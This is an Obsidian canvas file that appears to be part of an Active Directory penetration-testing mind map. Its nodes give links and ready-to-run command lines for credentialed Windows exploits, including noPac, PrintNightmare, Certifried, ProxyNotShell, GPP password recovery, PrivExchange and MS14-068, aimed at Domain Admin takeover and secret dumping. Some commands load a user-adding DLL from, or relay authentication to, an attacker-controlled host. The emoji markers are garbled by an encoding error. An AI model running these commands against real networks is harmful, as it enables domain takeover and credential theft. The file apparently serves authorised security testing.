{
	"nodes":[
		{"id":"e80036f00f073770","type":"group","x":-1760,"y":-1307,"width":4280,"height":4654,"color":"#aa8c46","label":"NEED CREDENTIALS VULNS"},
		{"id":"e4c6f9b81f56c549","type":"group","x":3520,"y":3154,"width":1080,"height":766,"color":"3","label":"MITM (LISTEN & RELAY)"},
		{"id":"380012add55daf25","type":"group","x":3520,"y":1074,"width":1080,"height":763,"color":"1","label":"DOMAIN ADMIN"},
		{"id":"79e4808e292e1253","type":"group","x":-3840,"y":640,"width":1080,"height":760,"label":"NO CREDENTIALS"},
		{"id":"371121d4f6044444","type":"group","x":3520,"y":34,"width":1080,"height":760,"color":"#e178e1","label":"GOT LOCAL ADMIN"},
		{"id":"90d16a8319fb813a","type":"group","x":3520,"y":2074,"width":1080,"height":760,"color":"#324bff","label":"DACL ABUSE"},
		{"id":"956ad0fbaec5c983","type":"group","x":3520,"y":-1066,"width":1080,"height":760,"color":"6","label":"LATERAL MOVE"},
		{"id":"6c5c54084e1e6b67","type":"file","file":"ATTACKS/LATERAL MOVE.canvas","x":3600,"y":-984,"width":920,"height":600,"color":"6"},
		{"id":"2a711b4e003bc7a1","type":"file","file":"ATTACKS/GOT LOCAL ADMIN ACCESS.canvas","x":3600,"y":114,"width":920,"height":600,"color":"#e178e1"},
		{"id":"fa6578ff74286669","type":"file","file":"ATTACKS/GOT DOMAIN ADMIN ACCESS.canvas","x":3600,"y":1154,"width":920,"height":600,"color":"1"},
		{"id":"6cc3a6d4db728692","type":"file","file":"ATTACKS/PERMISSIONS ABUSE.canvas","x":3600,"y":2154,"width":920,"height":600,"color":"#324bff"},
		{"id":"5c93dd0c20f055d9","type":"file","file":"ATTACKS/MITM (LISTEN & RELAY).canvas","x":3600,"y":3234,"width":920,"height":600,"color":"3"},
		{"id":"70b5896f26eafe19","type":"file","file":"INTERACTIVE-MAP.canvas","x":-3760,"y":720,"width":920,"height":600},
		{"id":"31a017493990cc07","x":-1680,"y":988,"width":480,"height":65,"color":"#aa8c46","type":"text","text":"# NEED CREDENTIALS VULNS"},
		{"id":"8009d7480b6bbf48","type":"text","text":"# üí• CVE-2021-42287 && CVE-2021-42278 (noPac)\n\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing#machine-account\n\n>[!example] Tools\n>- [NoPac](https://github.com/cube0x0/noPac)\n>- [netexec](https://github.com/Pennyw0rth/NetExec)\n\n\n```shell\n# Use netexec nopac module to scan for vulnerable host\nüï∑Ô∏è nxc smb <ip> -u 'user' -p 'pass' -M nopac\n# Exploit with nopac.py\n‚ö™   noPac.py '<DOMAIN>'/'<USERNAME>':'<PASSWORD>' -dc-ip '<DC_IP>' --impersonate Administrator -dump\n```","x":-960,"y":671,"width":2040,"height":483},
		{"id":"82fcf9640c0a7513","type":"text","text":"# üí• CVE-2021-1675 && CVE-2021-34527  (PrintNightmare)\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare#the-print-spooler\n\n\n>[!example] Tools\n>- [rpcdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py)\n>- [printnightmare](https://github.com/ly4k/PrintNightmare/blob/main/printnightmare.py)\n\n\n```shell\n#Check open pipes\nüü£ rpcdump.py @192.168.1.16 | egrep 'MS-RPRN|MS-PAR'\n# exploit using printnightmare script\n‚ö™ printnightmare.py -dll '\\\\<attacker_ip>\\smb\\add_user.dll' '<user>':'<password>'@'<ip>'\n```","x":-960,"y":1191,"width":2040,"height":480},
		{"id":"ed67c1e49ee8ef2f","type":"text","text":"# üí• CVE-2022-26923 (Certifried)\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/certifried#certifried\n>- https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4\n\n\n>[!example] Tools\n>- [Certipy](https://github.com/ly4k/Certipy)\n\n\n```shell\n# Create account\n‚ö™ certipy account create -u '<user>'@'<domain>' -p '<password>' -user 'certifriedpc' -pass 'certifriedpass' -dns '<fqdn_dc>'\n# Request Certificate\n‚ö™ certipy req -u 'certifriedpc$'@'<domain>' -p 'certifriedpass' -target '<ca_fqdn>' -ca '<ca_name>' -template Machine\n# Authenticate with certificate\n‚ö™ certipy auth -pfx '<pfx_file>' -username '<dc>$' -domain '<domain>' -dc-ip '<dc_ip>'\n```","x":-960,"y":1711,"width":2040,"height":521},
		{"id":"eeacacf0ef648fbe","type":"text","text":"# üí• CVE-2022-41040 && CVE-2022-41082 (ProxyNotShell)\n\n>[!info] Theory\n>- https://www.patrowl.io/en/actualites/critical-vulnerabilities-on-exchange-proxynotshell\n\n\n>[!example] Tools\n>- [Poc script](https://github.com/testanull/ProxyNotShell-PoC/)\n>\n\n\n```shell\n# proxynotshell exploit poc\n‚ö™ poc_aug3.py '<host>' '<username>' '<password>' '<command>'\n```","x":-960,"y":2271,"width":2040,"height":415},
		{"id":"e27b8b908d1d493d","type":"text","text":"# üí• CVE-2014-1812\n\n>[!info] Theory\n>- https://www.cvedetails.com/microsoft-bulletin/MS14-025\n>- https://www.thehacker.recipes/ad/movement/credentials/dumping/group-policies-preferences#theory\n\n\n>[!example] Tools\n>- [Get GPP password](https://github.com/fortra/impacket/blob/master/examples/Get-GPPPassword.py) \n\n\n```shell\n# find string containing password in files from sysvol share\nüîµ findstr /S /I cpassword \\\\<domain_fqdn>\\sysvol\\<domain_fqdn>\\policies\\*.xml\n# exploit using gpppassword script\nüü£ Get-GPPPassword.py '<domain>'/'<user>':'<password>'@'<dc_fqdn>'\n# scan using metasploit\n‚ìÇÔ∏è msf> use auxiliary/scanner/smb/smb_enum_gpp\n\n```","x":-960,"y":-349,"width":2040,"height":537},
		{"id":"4e69100bb2959a8a","type":"text","text":"#  üí• CVE-2019-0724 && CVE-2019-0686 (PrivExchange)\n\n>[!info] Theory\n>- https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/\n\n\n>[!example] Tools\n>- [DirkJan's Privexchange](https://github.com/dirkjanm/PrivExchange)\n\n\n```shell\n#Run privexhange script\n‚ö™ privexchange.py -ah '<attacker_ip>' '<exchange_host>' -u '<user>' -d '<domain>' -p '<password>'\n```","x":-960,"y":231,"width":2040,"height":406},
		{"id":"577520d608f6d31d","type":"text","text":"## üí• CVE-2014-6324 \n\n\n>[!info] Theory\n>- [MS14-068](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/ms14-068)\n\n\n>[!example] Tools\n>- [findsmp2uptime](https://github.com/SpiderLabs/Responder/blob/master/tools/FindSMB2UPTime.py)\n>- [ms14-068 exploit script](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-068/pykek/ms14-068.py)\n>- [GoldenPac](https://github.com/fortra/impacket/blob/master/examples/goldenPac.py)\n\n\n```shell\n# Using exploit script\n‚ö™ ms14-068.py -u '<user>'@'<domain>' -p '<password>' -s '<user_sid>' -d '<dc_fqdn>'\n# Using impacket's goldenpc script\nüü£ goldenPac.py -dc-ip '<dc_ip>' '<domain>'/'<user>':'<password>'@'target'\n# Using metasploit\n‚ìÇÔ∏è msf> use auxiliary/admin/kerberos/ms14_068_kerberos_checksum\n```","x":-960,"y":-964,"width":2040,"height":543},
		{"id":"1845471ae2992a31","type":"text","text":"# LOCAL ADMIN","x":1403,"y":2479,"width":294,"height":50,"color":"#e179dd"},
		{"id":"b6569ba6be2ce30d","type":"text","text":"# DCSYNC","x":1397,"y":1972,"width":190,"height":50,"color":"#1438ff"},
		{"id":"ac341ccc0ffd7a39","type":"text","text":"# DOMAIN ADMIN","x":1397,"y":1880,"width":300,"height":50,"color":"1"},
		{"id":"474593d360ce4723","type":"text","text":"# DCSYNC","x":1397,"y":800,"width":190,"height":50,"color":"#1438ff"},
		{"id":"9f349d40780484eb","type":"text","text":"# DOMAIN ADMIN","x":1397,"y":913,"width":300,"height":50,"color":"1"},
		{"id":"fa7484c1d74a0b05","type":"text","text":"# DOMAIN ADMIN","x":1397,"y":364,"width":300,"height":50,"color":"1"},
		{"id":"c346b8d590e30e5a","type":"text","text":"# DOMAIN ADMIN","x":1397,"y":-200,"width":300,"height":50,"color":"1"},
		{"id":"34583f5a1795873c","type":"text","text":"# PASS THE TICKET","x":1403,"y":2080,"width":357,"height":50,"color":"6"},
		{"id":"93b821942f6d3bc5","type":"text","text":"# PASS THE TICKET","x":1397,"y":1040,"width":357,"height":50,"color":"6"},
		{"id":"bafd8252e2c67cf0","type":"text","text":"# PASS THE TICKET","x":1397,"y":-640,"width":357,"height":50,"color":"6"},
		{"id":"e9b3a5ecf07ed043","type":"text","text":"# LOCAL ADMIN","x":1397,"y":434,"width":294,"height":50,"color":"#e179dd"},
		{"id":"58b6abb9688616c0","type":"text","text":"# LOCAL ADMIN","x":1397,"y":-520,"width":294,"height":50,"color":"#e179dd"},
		{"id":"f535005f1a92f529","type":"text","text":"# DOMAIN ADMIN","x":1397,"y":-742,"width":300,"height":50,"color":"1"}
	],
	"edges":[
		{"id":"ad6e079305a57524","fromNode":"79e4808e292e1253","fromSide":"right","toNode":"e80036f00f073770","toSide":"left"},
		{"id":"40bdaa53b01a98a0","fromNode":"e80036f00f073770","fromSide":"right","toNode":"956ad0fbaec5c983","toSide":"left","color":"6"},
		{"id":"c13109f4bff5c78d","fromNode":"e80036f00f073770","fromSide":"right","toNode":"371121d4f6044444","toSide":"left","color":"#e178ff"},
		{"id":"40063f858e210cb0","fromNode":"e80036f00f073770","fromSide":"right","toNode":"380012add55daf25","toSide":"left","color":"1"},
		{"id":"a581db0433ce8335","fromNode":"e80036f00f073770","fromSide":"right","toNode":"90d16a8319fb813a","toSide":"left","color":"#324bff"},
		{"id":"5fdb574a0b62c620","fromNode":"e80036f00f073770","fromSide":"right","toNode":"e4c6f9b81f56c549","toSide":"left","color":"3"},
		{"id":"ddee196e6c01dfeb","fromNode":"31a017493990cc07","fromSide":"right","toNode":"e27b8b908d1d493d","toSide":"left"},
		{"id":"08242be431c73ecd","fromNode":"31a017493990cc07","fromSide":"right","toNode":"4e69100bb2959a8a","toSide":"left"},
		{"id":"423f5a0ace36d30a","fromNode":"31a017493990cc07","fromSide":"right","toNode":"8009d7480b6bbf48","toSide":"left"},
		{"id":"a169c4eafba69bb8","fromNode":"31a017493990cc07","fromSide":"right","toNode":"82fcf9640c0a7513","toSide":"left"},
		{"id":"05397d719616a922","fromNode":"31a017493990cc07","fromSide":"right","toNode":"ed67c1e49ee8ef2f","toSide":"left"},
		{"id":"b2eb977dac4925be","fromNode":"31a017493990cc07","fromSide":"right","toNode":"eeacacf0ef648fbe","toSide":"left"},
		{"id":"37aa0d6eb957a901","fromNode":"31a017493990cc07","fromSide":"right","toNode":"577520d608f6d31d","toSide":"left"}
	]
}